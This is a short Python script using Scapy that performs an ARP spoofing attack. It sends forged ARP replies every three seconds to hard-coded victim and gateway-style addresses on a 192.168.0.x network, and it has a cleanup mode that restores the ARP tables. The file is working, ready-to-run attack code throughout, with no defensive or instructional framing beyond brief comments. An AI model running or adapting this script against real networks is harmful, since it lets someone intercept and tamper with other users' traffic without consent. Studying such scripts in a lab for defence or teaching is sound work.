#!/usr/bin/env python

# ARP Spoof attack
# Stoenescu Horia

# ARP Spoofing attack using Scapy
# At each 3 seconds, an ARP reply with the spoofed MAC address is sent to the victim and to the default gateway/another IP from the same subnet

from sys import argv
from scapy.all import *
from scapy.layers.l2 import Ether, ARP
import time

# Takes as parameters:
# - attack (first value)
# - clean (clean the arp table from the client and the server)
if len(sys.argv) != 2:
    print "Usage: python arp_spoof_scapy.py attack/clean"
    exit(0)
else:
    test_phase = sys.argv[1]

#####################################
# layer 2 addresses
hw_dst_victim="74:d0:2b:03:bd:67"
#samsung phone
hw_dst_other_host="4c:66:41:7e:fa:d1"
#hw_dst_other_host="78:54:2e:a6:e7:82"
hw_src_spoofed="08:00:27:81:b1:df"
#####################################
# layer 3 addresses - proto 0x800
ip_dst_victim="192.168.0.100"
ip_dst_other_host="192.168.0.101"
arp_proto_type=0x806

if test_phase == "attack":
    print "Begin ARP spoof attack on victim and other host"
    # The first spoofing is between the victim <---> Kali
    ether_pack1=Ether(dst=hw_dst_victim,src=hw_src_spoofed,type=arp_proto_type)
    arp_pack1=ARP(hwtype=0x1,ptype=0x800,hwlen=6,plen=4,op=2,hwsrc=hw_src_spoofed,psrc=ip_dst_other_host,hwdst=hw_dst_victim,pdst=ip_dst_victim)
    pack1=ether_pack1/arp_pack1
    print "First packet"
    pack1.show()

    # The second one is between the Kali <---> other host
    ether_pack2=Ether(dst=hw_dst_other_host,src=hw_src_spoofed,type=arp_proto_type)
    arp_pack2=ARP(hwtype=0x1,ptype=0x800,hwlen=6,plen=4,op=2,hwsrc=hw_src_spoofed,psrc=ip_dst_victim,hwdst=hw_dst_other_host,pdst=ip_dst_other_host)
    pack2=ether_pack2/arp_pack2
    print "Second packet:"
    pack2.show()
    while True:
        sendp(pack1), sendp(pack2)
        time.sleep(3) 
else:
    print "Cleaning ARP tables on victim and other host"
    # Clean the connection between victim <---> Kali
    # hw_dst_other_host is the MAC address of the router(other host from the network)
    ether_pack1_clean = Ether(dst=hw_dst_victim,src=hw_dst_other_host,type=arp_proto_type)
    arp_pack1_clean=ARP(hwtype=0x1, ptype=0x800,hwlen=6,plen=4,op=2,hwsrc=hw_dst_other_host,psrc=ip_dst_other_host,hwdst=hw_dst_victim,pdst=ip_dst_victim)
    pack1_clean=ether_pack1_clean/arp_pack1_clean
    print "First packet:"
    pack1_clean.show()

    # Clean the 2nd connection: Kali <---> other host
    ether_pack2_clean=Ether(dst=hw_dst_other_host,src=hw_dst_victim,type=arp_proto_type)
    arp_pack2_clean=ARP(hwtype=0x1,ptype=0x800,hwlen=6,plen=4,op=2,hwsrc=hw_dst_victim,psrc=ip_dst_victim,hwdst=hw_dst_other_host,pdst=ip_dst_other_host)
    pack2_clean = ether_pack2_clean/arp_pack2_clean
    print "Second packet:"
    pack2_clean.show()

    # Send for 5 times the arp replies to clean the tables from victim and other host
    var = 1
    while var <= 5:
        sendp(pack1_clean), sendp(pack2_clean)
        time.sleep(3)
        var += 1

